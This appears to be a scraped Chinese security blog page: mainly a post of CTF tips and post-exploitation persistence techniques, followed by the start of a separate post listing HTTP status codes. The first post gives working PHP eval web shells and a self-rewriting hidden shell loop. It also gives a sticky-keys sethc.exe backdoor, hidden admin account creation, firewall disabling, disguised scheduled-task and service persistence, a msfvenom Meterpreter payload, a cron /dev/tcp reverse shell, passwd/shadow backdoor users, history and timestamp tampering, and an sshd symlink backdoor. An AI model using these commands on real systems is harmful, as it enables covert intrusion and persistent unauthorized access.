<h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><p>cat:由第一行开始显示内容，并将所有内容输出<br>tac:从最后一行倒序显示内容，并将所有内容输出<br>more:根据窗口大小，一页一页的现实文件内容<br>less:和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head:只显示头几行<br>tail:只显示最后几行<br>nl:类似于cat -n，显示时输出行号<br>tailf:类似于tail -f<br>sort%20&#x2F;flag 读文件<br>dir来查看当前目录文件</p>
<p>ctrl + u（强制打开浏览器控制台）</p>
<p>view-source:（放在网站开头，打开网页源码）</p>
<p>看源码</p>
<p>看UA头</p>
<p>看robots.txt(机器人文件。)</p>
<p>看index.phps(下载)</p>
<p>kali目录扫描dirsearch -r: <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>swp数据交换文件</p>
<p>cookie</p>
<p>kali中nslookup查看dns域名解析。</p>
<p>源码泄露重要(editor)信息，上传文件空间查看var-&gt;www-&gt;html-&gt;nothinghere</p>
<p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
<p>探针泄露，网站&#x2F;tz.php,点phpinfo，找ctf</p>
<p>数据库泄露,sql备份，backup.</p>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>eval（）和assert（）函数导致的代码执行漏洞大多是因为载入缓存或者模板以及对变量的处理不严格导致，比如直接把一个外部可控的参数拼接到模板里面，然后调用这两个函数去当成PHP代码执行。</p>
<p>preg_replace（）函数的代码执行需要存在&#x2F;e参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签以及文章内容等过滤功能。</p>
<p>call_user_func（）和call_user_func_array（）函数的功能是调用函数，多用在框架里面动态调用函数，所以一般比较小的程序出现这种方式的代码执行会比较少。array_map（）函数的作用是调用函数并且除第一个参数外其他参数为数组，通常会写死第一个参数，即调用的函数。</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>eval      <code>&lt;?php @eval($_POST[cmd])?&gt;</code></p>
<p>assert  <code>&lt;?php @assert($_POST[cmd])?&gt;</code></p>
<p>call_user_func()  <code>&lt;call_user_func($_POST[&#39;fun&#39;],$_POST[&#39;arg&#39;])&gt;</code></p>
<p>call_user_func_array()  <code>&lt;?php call_user_func_array($_POST[&#39;fun&#39;], $_POST[&#39;arg&#39;]);?&gt;</code></p>
<p>create_function()  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$code = &#x27;echo&#x27;.$func.&#x27;test&#x27;.$id.&#x27;;&#x27;;</span><br><span class="line">creat_function(&#x27;$func&#x27;,$code)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>array_map()</p>
<p>preg_replace()</p>
<h4 id="加密，密码学"><a href="#加密，密码学" class="headerlink" title="加密，密码学"></a>加密，密码学</h4><p>机密性</p>
<p>完整性</p>
<p>可用性</p>
<p>认证性</p>
<p>不可否认性</p>
<p><strong>凯撒密码：</strong></p>
<p>偏移编码，一般是4位或13位</p>
<p><strong>Base家族：</strong></p>
<p>base16、64、58、62、85、91、92、100</p>
<p>Unicode编码：</p>
<p>中文编码</p>
<p><strong>URL编码：</strong></p>
<p>XXEncode:</p>
<p>花朵编码：，音符编码：，文言文编码：</p>
<p><strong>猪圈密码：</strong></p>
<p>ROTN：</p>
<p>ROT5&#x2F;13&#x2F;18&#x2F;47(偏移编码)</p>
<p><strong>佛曰加密：</strong></p>
<p>盲文编码：</p>
<p>培根密码：</p>
<p>三分密码：</p>
<p><strong>栅栏密码：</strong></p>
<p>jsfuck编码：</p>
<p>摩斯密码：</p>
<p>phpfuck：</p>
<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.</span><br><span class="line">set_time_limit(0);//通过set_time_limit(0)可以让程序无限制的执行下去</span><br><span class="line">$interval = 5; // 每隔*秒运行</span><br><span class="line">do &#123;</span><br><span class="line">$filename = &#x27;test.php&#x27;;</span><br><span class="line">if(file_exists($filename)) &#123;</span><br><span class="line">echo &quot;xxx&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$file = fopen(&quot;test.php&quot;, &quot;w&quot;);</span><br><span class="line">$txt = &quot;&lt;?php @eval($_POST[cmd]); ?&gt;\n&quot;;   //木马密码cmd</span><br><span class="line">fwrite($file, $txt);</span><br><span class="line">fclose($file);</span><br><span class="line">eval(system(&quot;Attrib +s +a +h +r test.php&quot;)); //隐藏文件</span><br><span class="line">&#125;</span><br><span class="line">sleep($interval);</span><br><span class="line">&#125; while (true);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="锁屏下开命令行"><a href="#锁屏下开命令行" class="headerlink" title="锁屏下开命令行"></a>锁屏下开命令行</h4><p>命令行下输入下面语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bak</span><br><span class="line"></span><br><span class="line">Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>

<p>如果报错或其他原因，可以去手动更改。</p>
<p>搜索C:\Windows\System32文件夹里的sethc.exe文件。右键打开文件路径。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121204650077.png" alt="image-20240121204650077"></p>
<p>返回上一级目录，右键System32文件夹，点击属性&#x3D;》安全&#x3D;》高级&#x3D;》更改&#x3D;》高级。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205120830.png" alt="image-20240121205120830"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205213425.png" alt="image-20240121205213425"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205301672.png" alt="image-20240121205301672"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205340869.png" alt="image-20240121205340869"></p>
<p>点击立即查找&#x3D;》选着Everyone&#x3D;》点击确定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205846981.png" alt="image-20240121205846981"></p>
<p>勾选如图两个内容，点击确定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205652850.png" alt="image-20240121205652850"></p>
<p>进入System32将文件sethc.exe改为sethc.exe1</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121210215246.png" alt="image-20240121210215246"></p>
<p>搜索cmd.exe,打开路径。</p>
<p>将其复制并改名为setch.exe</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121210539449.png" alt="image-20240121210539449"></p>
<p>win+L    息屏</p>
<p>连续按五次shift即可打开命令行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121210737866.png" alt="image-20240121210737866"></p>
<p>net user qianxin QanXin.Nb123 &#x2F;add<br>net localgroup administrators qianxin &#x2F;add<br>netsh firewall set opmode disable<br>netsh advfirewall show allprofiles<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br>netstat -anop tcp | find “3389”</p>
<h5 id="创建我的电脑"><a href="#创建我的电脑" class="headerlink" title="创建我的电脑"></a>创建我的电脑</h5><p>创建文件夹，将文件夹名改为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;    </span><br><span class="line">回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125; </span><br><span class="line">拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125; </span><br><span class="line">打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125; </span><br><span class="line">控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125; </span><br><span class="line">⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;  </span><br></pre></td></tr></table></figure>

<h4 id="创建不可删除文件"><a href="#创建不可删除文件" class="headerlink" title="创建不可删除文件"></a>创建不可删除文件</h4><h5 id="文件夹"><a href="#文件夹" class="headerlink" title="文件夹"></a>文件夹</h5><p>创建文件夹夹(创建的文件夹很难删除)，在c盘的用户的Administrator中创建a…文件夹。可以放到网站根目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md a...\</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122151802764.png" alt="image-20240122151802764"></p>
<p>可以将文件copy到文件a…文件夹中。</p>
<p>删除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rd /s /q a...\</span><br></pre></td></tr></table></figure>

<h5 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h5><p>Windows 下不能够以下⾯这些字样来命名⽂件&#x2F;⽂件夹，包括：aux，com1，com2，prn，con和nul等，但 是通过cmd下是可以创建此类⽂件夹的，使⽤copy命令即可实现 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.php  \\.\D:\desk\www\aux.php</span><br></pre></td></tr></table></figure>

<p>查看文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\.\C:\phpstudy_pro\WWW\wo\aux.php</span><br></pre></td></tr></table></figure>

<p>删除文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del \\.\C:\phpstudy_pro\WWW\wo\aux.php</span><br></pre></td></tr></table></figure>

<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>在计划任务\Microsoft\WindowsUpdate\Tasks\Secute\Update有一个触发器。可以用其自动启用木马。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123102339349.png" alt="image-20240123102339349"></p>
<p>设置一个触发器使其每一分钟就触发一次木马。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;\Microsoft\WindowsUpdate\Tasks\Secute\Update\Run&quot; /tr &quot;C:\Users\Administrator\Desktop\Server.exe&quot; /rl highest /F /sc minute /mo 1  /RU system</span><br></pre></td></tr></table></figure>

<p>可以在任务管理器中找到木马，结束任务。发现在一分钟后又会自启动。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123103914650.png" alt="image-20240123103914650"></p>
<p>可以在任务计划里右键将其删除。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123104023435.png" alt="image-20240123104023435"></p>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>设置开机自启。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;.NET CLR Networking 3.5.0.0&quot; binpath= &quot;cmd.exe /k C:\Users\Administrator\Desktop\Server.exe&quot; depend= Tcpip obj= Localsystem start= auto</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123110118811.png" alt="image-20240123110118811"></p>
<p>查询</p>
<p>可以在任务管理器的服务中找到.NET CLR Networking 3.5.0.0</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123110650724.png" alt="image-20240123110650724"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc   //查看sc命令</span><br><span class="line">sc query &quot;.NET CLR Networking 3.5.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete &quot;.NET CLR Networking 3.5.0.0&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123110746474.png" alt="image-20240123110746474"></p>
<h5 id="将生成的服务更难删除"><a href="#将生成的服务更难删除" class="headerlink" title="将生成的服务更难删除"></a>将生成的服务更难删除</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc sdset &quot;.NET CLR Networking 3.5.0.0&quot; &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br></pre></td></tr></table></figure>

<p>永恒账户</p>
<p>注册表</p>
<p>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\qianxin$</p>
<h3 id="kali命令执行"><a href="#kali命令执行" class="headerlink" title="kali命令执行"></a>kali命令执行</h3><h4 id="kali写码"><a href="#kali写码" class="headerlink" title="kali写码"></a>kali写码</h4><p>进入msfconsole集中控制台。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122191100724.png" alt="image-20240122191100724"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122192311431.png" alt="image-20240122192311431"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122192531468.png" alt="image-20240122192531468"></p>
<p>yes代表哪一行是必填的，要在lhost中填入kali的ip地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ifconfig  //查ip地址</span><br><span class="line">set lhost 192.168.2.77</span><br><span class="line">show options //查看是否改完</span><br><span class="line">run  //运行</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122193140128.png" alt="image-20240122193140128"></p>
<h4 id="生成码"><a href="#生成码" class="headerlink" title="生成码"></a>生成码</h4><p>在另一个页面输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p //查看msfvenom怎么用</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.59 lport=4444 -f exe -o 1.exe  //生成一个名为1.php的码</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122193719290.png" alt="image-20240122193719290"></p>
<p>将生成的码移到win10虚拟机中，双击运行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122195333336.png" alt="image-20240122195333336"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">whoami</span><br><span class="line">help</span><br><span class="line">shell</span><br><span class="line">chcp 65001   //转换成中文</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">//explorer.exe是系统一定有的文件，启动桌面</span><br><span class="line">migrate 8644 //隐藏1.txt码</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122200649909.png" alt="image-20240122200649909"></p>
<p>shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -c &#x27;/bin/sh -i &gt;&amp;/dev/tcp/192.168.2.77/4444 0&gt;&amp;1&#x27;;\r%100c\n</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>



<p>要修改时间，要将该文件的所有父目录都需改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -r 源文件名 新文件名</span><br></pre></td></tr></table></figure>

<p>文件上锁</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chattr +i 1.txt  //加锁</span><br><span class="line">chattr -i 1.txt  //解锁</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123144620155.png" alt="image-20240123144620155"></p>
<p>不记录历史记录操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .zsh_history   //.zsh_history是一个记录历史命令的文件</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123145158614.png" alt="image-20240123145158614"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set +o history  //开头带一个空格的将不会被记录</span><br><span class="line">set -o history</span><br><span class="line">history -d 220(set +o history语句所在的行数)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123145958114.png" alt="image-20240123145958114"></p>
<p>使用文件创建用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/passwd</span><br><span class="line">在后面添加qing:x:1001:1001::/qing:/bin/bash</span><br><span class="line">vim /etc/shadow</span><br><span class="line">在后面添加qing:$1$g2KIWGC6$9xDPCB2Ok9D4MCaVbju2s.（密码）:19421:0:99999:7:::</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd 密码</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123153222315.png" alt="image-20240123153222315"></p>
<p>可以用su进行登入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su qing</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123153301498.png" alt="image-20240123153301498"></p>
<h4 id="ssh软连接后门"><a href="#ssh软连接后门" class="headerlink" title="ssh软连接后门"></a>ssh软连接后门</h4><p>关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop firewalld</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oPort=1234 </span><br><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345</span><br><span class="line">ssh root@192.168.1.148 -p12345</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clrmsspnz0005j0u42nmeebf0" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-网页状态码" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/17/%E7%BD%91%E9%A1%B5%E7%8A%B6%E6%80%81%E7%A0%81/" class="article-date">
  <time class="post-time" datetime="2024-01-17T12:13:00.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">17</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/17/%E7%BD%91%E9%A1%B5%E7%8A%B6%E6%80%81%E7%A0%81/">网页状态码</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><blockquote>
<p>浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。</p>
<p>HTTP状态码的英文为HTTP Status Code。</p>
</blockquote>
<p>下面是常见的HTTP状态码：</p>
<ul>
<li>200 - 请求成功</li>
<li>301 - 资源（网页等）被永久转移到其它URL</li>
<li>404 - 请求的资源（网页等）不存在</li>
<li>500 - 内部服务器错误</li>
</ul>
<h4 id="HTTP状态码分类"><a href="#HTTP状态码分类" class="headerlink" title="HTTP状态码分类"></a>HTTP状态码分类</h4><p>HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>分类描述</th>
</tr>
</thead>
<tbody><tr>
<td>1**</td>
<td>信息，服务器收到请求，需要请求者继续执行操作</td>
</tr>
<tr>
<td>2**</td>
<td>成功，操作被成功接收并处理</td>
</tr>
<tr>
<td>3**</td>
<td>重定向，需要进一步的操作以完成请求</td>
</tr>
<tr>
<td>4**</td>
<td>客户端错误，请求包含语法错误或无法完成请求</td>
</tr>
<tr>
<td>5**</td>
<td>服务器错误，服务器在处理请求的过程中发生了错误</td>
</tr>
</tbody></table>
<h4 id="HTTP状态码列表"><a href="#HTTP状态码列表" class="headerlink" title="HTTP状态码列表"></a>HTTP状态码列表</h4><table>
<thead>
<tr>
<th>状态码</th>
<th>状态码英文名称</th>
<th>中文描述</th>
</tr>
</thead>
<tbody><tr>
<td>100</td>
<td>Continue</td>
<td>继续。客户端应继续其请求</td>
</tr>
<tr>
<td>101</td>
<td>Switching Protocols</td>
<td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>200</td>
<td>OK</td>
<td>请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td>201</td>
<td>Created</td>
<td>已创建。成功请求并创建了新的资源</td>
</tr>
<tr>
<td>202</td>
<td>Accepted</td>
<td>已接受。已经接受请求，但未处理完成</td>
</tr>
<tr>
<td>203</td>
<td>Non-Authoritative Information</td>
<td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td>
</tr>
<tr>
<td>204</td>
<td>No Content</td>
<td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td>205</td>
<td>Reset Content</td>
<td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
</tr>
<tr>
<td>206</td>
<td>Partial Content</td>
<td>部分内容。服务器成功处理了部分GET请求</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>300</td>
<td>Multiple Choices</td>
<td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
</tr>
<tr>
<td>301</td>
<td>Moved Permanently</td>
<td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td>
</tr>
<tr>
<td>302</td>
<td>Found</td>
<td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td>
</tr>
<tr>
<td>303</td>
<td>See Other</td>
<td>查看其它地址。与301类似。使用GET和POST请求查看</td>
</tr>
<tr>
<td>304</td>
<td>Not Modified</td>
<td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td>
</tr>
<tr>
<td>305</td>
<td>Use Proxy</td>
<td>使用代理。所请求的资源必须通过代理访问</td>
</tr>
<tr>
<td>306</td>
<td>Unused</td>
<td>已经被废弃的HTTP状态码</td>
</tr>
<tr>
<td>307</td>
<td>Temporary Redirect</td>
<td>临时重定向。与302类似。使用GET请求重定向</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>400</td>
<td>Bad Request</td>
<td>客户端请求的语法错误，服务器无法理解</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized</td>
<td>请求要求用户的身份认证</td>
</tr>
<tr>
<td>402</td>
<td>Payment Required</td>
<td>保留，将来使用</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden</td>
<td>服务器理解请求客户端的请求，但是拒绝执行此请求</td>
</tr>
<tr>
<td>404</td>
<td>Not Found</td>
<td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td>
</tr>
<tr>
<td>405</td>
<td>Method Not Allowed</td>
<td>客户端请求中的方法被禁止</td>
</tr>
<tr>
<td>406</td>
<td>Not Acceptable</td>
<td>服务器无法根据客户端请求的内容特性完成请求</td>
</tr>
<tr>
<td>407</td>
<td>Proxy Authentication Required</td>
<td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td>408</td>
<td>Request Time-out</td>
<td>服务器等待客户端发送的请求时间过长，超时</td>
</tr>
<tr>
<td>409</td>
<td>Conflict</td>
<td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
</tr>
<tr>
<td>410</td>
<td>Gone</td>
<td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
</tr>
<tr>
<td>411</td>
<td>Length Required</td>
<td>服务器无法处理客户端发送的不带Content-Length的请求信息</td>
</tr>
<tr>
<td>412</td>
<td>Precondition Failed</td>
<td>客户端请求信息的先决条件错误</td>
</tr>
<tr>
<td>413</td>
<td>Request Entity Too Large</td>
<td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td>
</tr>
<tr>
<td>414</td>
<td>Request-URI Too Large</td>
<td>请求的URI过长（URI通常为网址），服务器无法处理</td>
</tr>
<tr>
<td>415</td>
